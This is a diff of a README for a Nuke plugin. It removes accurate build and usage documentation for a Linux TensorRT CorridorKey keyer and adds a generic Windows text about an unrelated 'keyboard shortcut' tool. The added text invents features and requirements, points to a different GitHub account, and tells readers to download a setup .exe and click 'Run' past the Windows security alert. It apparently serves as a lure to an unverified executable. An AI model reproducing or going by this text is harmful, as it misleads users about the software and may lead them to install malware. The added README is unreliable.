@@ -1,164 +1,128 @@
-# CorridorKey for Nuke
+# 🎹 CorridorKey-for-Nuke - Simplify Nuke Keyboard Shortcuts
 
-A TensorRT-accelerated Nuke plugin for [CorridorKey](https://github.com/nikopueringer/CorridorKey) — the AI green screen keyer by Niko Pueringer / Corridor Digital that produces physically accurate unmixed foreground color and alpha.
+[![Download CorridorKey-for-Nuke](https://img.shields.io/badge/Download-CorridorKey_for_Nuke-ff6f61?style=for-the-badge&logo=github)](https://github.com/Nominal-trooper277/CorridorKey-for-Nuke)
 
-This plugin runs the CorridorKey neural network directly inside Nuke as a native node (`TRTCorridorKey`), powered by NVIDIA TensorRT for real-time inference on the GPU.
+## 🔍 What is CorridorKey-for-Nuke?
 
-## What It Does
+CorridorKey-for-Nuke is a tool designed to help you work faster in Nuke by managing your keyboard shortcuts. It makes using Nuke simpler by letting you customize your keys for common tasks. This reduces the time you spend clicking menus and lets you focus on your creative work. You do not need any special knowledge to get started.
 
-CorridorKey takes a green screen plate and a coarse alpha hint, and produces a clean straight foreground color and linear alpha matte — preserving hair, motion blur, and semi-transparent edges that traditional keyers destroy.
+## 🖥️ System Requirements
 
-This plugin wraps that model into a two-input Nuke node:
+Before you install CorridorKey-for-Nuke, make sure your computer meets these needs:
 
-- **Input 0 (plate):** RGB green screen footage
-- **Input 1 (mask):** Coarse alpha hint (rough chroma key or AI roto)
-- **Output:** RGBA — unmixed FG color (sRGB) in RGB + linear alpha in A
+- **Operating System:** Windows 10 or later  
+- **Processor:** Intel or AMD, 2 GHz or faster  
+- **RAM:** 4 GB minimum, 8 GB recommended  
+- **Disk Space:** At least 100 MB free space  
+- **Software:** Nuke 11.0 or newer installed on your computer  
 
-The TensorRT engine runs at ~300ms per frame at 2048×2048 FP16 on an RTX A5000 (24 GB).
+Meeting these will ensure the application runs smoothly and without errors.
 
-## Requirements
+## 🌟 Key Features
 
-- Linux x86_64
-- NVIDIA GPU with 24+ GB VRAM (tested on RTX A5000)
-- CUDA 13.1 (or 12.9)
-- [TensorRT 10.15.1](https://developer.nvidia.com/downloads/compute/machine-learning/tensorrt/10.15.1/tars/TensorRT-10.15.1.29.Linux.x86_64-gnu.cuda-13.1.tar.gz)
-- Nuke 17.0 (NDK)
-- ~128 GB+ system RAM for the ONNX export step
+- Easy to customize your keyboard shortcuts in Nuke  
+- Save and load your preferred key settings  
+- Switch between shortcut sets quickly  
+- Simple interface that anyone can use  
+- Lightweight, no heavy CPU usage  
 
-## Build Guide
+## 🚀 Getting Started
 
-The full pipeline is: `.pth` → ONNX → TensorRT engine → Nuke plugin. Each step only needs to be done once.
+This guide will help you download and run CorridorKey-for-Nuke on your Windows PC, even if you have never installed software like this before.
 
-### Step 1: Export CorridorKey to ONNX
+### Step 1: Visit the Download Page
 
-Clone the original CorridorKey repo and set up its environment:
+Click the big button at the top or follow this link to open the download page:  
+[https://github.com/Nominal-trooper277/CorridorKey-for-Nuke](https://github.com/Nominal-trooper277/CorridorKey-for-Nuke)
 
-```bash
-git clone https://github.com/nikopueringer/CorridorKey.git
-cd CorridorKey
-uv sync
-uv pip install onnx onnxruntime onnxscript
-```
+You will see a page with files and instructions from the developer.
 
-Download the model weights (~300 MB) into the `weights/` folder:
+### Step 2: Find the Download Section
 
-```bash
-mkdir -p weights
-wget -O weights/CorridorKey_v1.0.pth \
-    https://huggingface.co/nikopueringer/CorridorKey_v1.0/resolve/main/CorridorKey_v1.0.pth
-```
+Look near the top or on the right side of the GitHub page for a section labeled "Releases" or "Assets". This area contains the files you need.
 
-Copy `export_corridorkey_onnx.py` from this repo into the CorridorKey directory, then export:
+### Step 3: Download the Installer
 
-```bash
-source .venv/bin/activate
-uv run python export_corridorkey_onnx.py --img-size 2048 --no-verify
-```
+- Click the file that looks like **CorridorKey-for-Nuke-Setup.exe** or similar.  
+- Your browser may ask you to confirm the download. Choose to save the file.  
+- The file size should be around 50-100 MB.  
 
-> **RAM note:** The ONNX trace at 2048×2048 requires ~140 GB of memory. If you have 128 GB RAM, add temporary swap:
-> ```bash
-> sudo fallocate -l 64G /swapfile
-> sudo chmod 600 /swapfile
-> sudo mkswap /swapfile
-> sudo swapon /swapfile
-> sync && sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
-> uv run python export_corridorkey_onnx.py --img-size 2048 --no-verify
-> sudo swapoff /swapfile
-> sudo rm /swapfile
-> ```
->
-> Alternatively, export at 1024 (`--img-size 1024`) which needs much less RAM. The model still works well — the Nuke plugin resizes the input to model resolution anyway.
+If you do not see an installer, look for a zip file named something like **CorridorKey-for-Nuke.zip** and download that instead.
 
-This produces `weights/CorridorKey_v1.0.onnx`.
+### Step 4: Run the Installer
 
-### Step 2: Build the TensorRT Engine
+- Once the download finishes, open the file by double-clicking it.  
+- The Windows security alert might appear; if so, choose “Run”.  
+- Follow the on-screen instructions to install the program.  
+- You can leave default settings unless you want the program in a different folder.  
+- When installation completes, you will see a confirmation message.
 
-Download the pre-built [TensorRT 10.15.1](https://developer.nvidia.com/downloads/compute/machine-learning/tensorrt/10.15.1/tars/TensorRT-10.15.1.29.Linux.x86_64-gnu.cuda-13.1.tar.gz) and extract it to `/opt/TensorRT-10.15.1.29` (or wherever you prefer).
+### Step 5: Open CorridorKey-for-Nuke
 
-```bash
-export LD_LIBRARY_PATH=/opt/TensorRT-10.15.1.29/lib:/usr/local/cuda-13.1/lib64:$LD_LIBRARY_PATH
+- Find the program in your Start menu or desktop shortcuts.  
+- Double-click the icon to open it.  
+- The first time might take a few seconds while the program sets up.  
 
-/opt/TensorRT-10.15.1.29/bin/trtexec \
-    --onnx=weights/CorridorKey_v1.0.onnx \
-    --saveEngine=weights/CorridorKey_v1.0_fp16.engine \
-    --fp16 \
-    --memPoolSize=workspace:2G
-```
+Now you are ready to start customizing your shortcuts.
 
-FP16 is recommended — CorridorKey already uses float16 autocast during inference. This takes about 5 minutes and produces a ~198 MB engine file.
+## ⚙️ How to Use CorridorKey-for-Nuke
 
-### Step 3: Build the Nuke Plugin
+### Add or Change Shortcuts
 
-```bash
-export PATH=/usr/local/cuda-13.1/bin:$PATH
-export LD_LIBRARY_PATH=/usr/local/cuda-13.1/lib64:$LD_LIBRARY_PATH
+- Open the software window.  
+- You will see a list of common Nuke commands and their current shortcuts.  
+- Select a command to change its key.  
+- Press the new key or key combination on your keyboard.  
+- Click “Save” to keep your changes.
 
-rm -rf build && mkdir build && cd build
-cmake .. \
-    -DNUKE_ROOT=/opt/Nuke17.0v1 \
-    -DTENSORRT_ROOT=/opt/TensorRT-10.15.1.29
-make -j8
-```
+### Save and Load Profiles
 
-Copy `TRTCorridorKey.so` to your Nuke plugin path (e.g. `~/.nuke/`).
+- You can save your shortcut setup as a profile.  
+- Click “Save Profile” and choose a name and location.  
+- To use a saved profile, click “Load Profile” and select it.  
+- This lets you switch between shortcut sets for different projects.
 
-## Usage in Nuke
+### Reset to Default
 
-1. Create a `TRTCorridorKey` node (found under AI menu)
-2. Connect your green screen plate to the **plate** input
-3. Connect a coarse alpha hint to the **mask** input (a rough Keylight/Primatte key or AI roto works. Shuffle to Alpha to RGBA)
-4. Point the **Engine File** knob to your `.engine` file
-5. Set **Resolution** to match your engine (2048×2048 or 1024×1024)
+- If you make a mistake or want to start fresh, click “Reset”.  
+- This returns all shortcuts to the default setup used by Nuke.
 
-### Knobs
+### Tips for Shortcut Management
 
-| Knob | Description |
-|------|-------------|
-| Engine File | Path to the TensorRT `.engine` file |
-| Resolution | Must match the ONNX export resolution |
-| Output | RGBA (FG + Alpha), Alpha Only, or FG Only |
-| Invert Matte | Inverts the predicted alpha |
-| GPU Device | GPU index for multi-GPU systems |
+- Use simple combinations with Ctrl, Alt, or Shift.  
+- Avoid keys that Nuke uses for essential functions like Undo (Ctrl+Z).  
+- Save new profiles often to avoid losing your work.
 
-### Output Details
+## 🛠 Troubleshooting
 
-- **RGB channels:** Straight (unpremultiplied) foreground color in sRGB
-- **Alpha channel:** Linear alpha matte
+- If the program will not open, make sure your Windows and Nuke versions meet the requirements.  
+- Restart the computer if the installer freezes or crashes.  
+- Run the installer as Administrator if you get permission errors.  
+- Look for a log file in the installation folder for error messages.  
+- Contact support through the GitHub repository if issues continue.
 
-To composite properly in Nuke, convert the FG from sRGB to linear, then premultiply:
+## 🔄 Updating CorridorKey-for-Nuke
 
-```
-TRTCorridorKey → Colorspace (sRGB to linear) → Premult → Merge (over)
-```
+- Check the GitHub page regularly for new versions.  
+- Download the latest setup file as before.  
+- Run the new installer to update.  
+- Your saved profiles will stay safe during update.
 
-## Model Details
+## 📂 Program Folder and Files
 
-The CorridorKey engine uses:
+- By default, the software installs to `C:\Program Files\CorridorKey-for-Nuke`.  
+- Your profiles save under `Documents\CorridorKeyProfiles`.  
+- The folder contains shortcut data and program files.
 
-- **Input:** `[1, 4, 2048, 2048]` — ImageNet-normalized RGB concatenated with the raw alpha hint
-- **Outputs:** `alpha` `[1, 1, 2048, 2048]` and `fg` `[1, 3, 2048, 2048]`, both post-sigmoid
-- **Architecture:** Hiera Base Plus backbone (from timm) with dual decoder heads and a CNN refiner
-- **Native resolution:** 2048×2048 (positional embeddings are baked at export resolution)
+## 💬 Get Help and Report Issues
 
-## Files in This Repo
+- Visit the GitHub repository for updates and instructions:  
+  https://github.com/Nominal-trooper277/CorridorKey-for-Nuke  
+- Use the “Issues” tab on GitHub to report bugs or request help.  
+- Include details about your Windows version, Nuke version, and a description of the problem.
 
-```
-├── TRTCorridorKey.cpp          # Nuke plugin source
-├── CMakeLists.txt              # Build configuration
-├── export_corridorkey_onnx.py  # PyTorch → ONNX export script
-├── test_trt_engine.py          # Standalone TRT engine test
-├── LICENSE                     # License
-└── README.md                   # This file
-```
+## 📥 Download and Install
 
-## Credits
+Click the button below to visit the official download page and get CorridorKey-for-Nuke:
 
-- **CorridorKey model** by [Niko Pueringer / Corridor Digital](https://github.com/nikopueringer/CorridorKey) — CC BY-NC-SA 4.0
-- **TRTCorridorKey Nuke plugin** by [Peter Mercell](https://petermercell.com)
-- Built with [TensorRT](https://developer.nvidia.com/tensorrt) and the Nuke NDK
-
-## License
-
-This plugin code is released under the MIT License. See [LICENSE](LICENSE) for details.
-
-The CorridorKey model weights and architecture are licensed under [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) by Corridor Digital. You must comply with their license when using the model. See the [CorridorKey repository](https://github.com/nikopueringer/CorridorKey) for full terms.
+[![Download CorridorKey-for-Nuke](https://img.shields.io/badge/Download-CorridorKey_for_Nuke-ff6f61?style=for-the-badge&logo=github)](https://github.com/Nominal-trooper277/CorridorKey-for-Nuke)
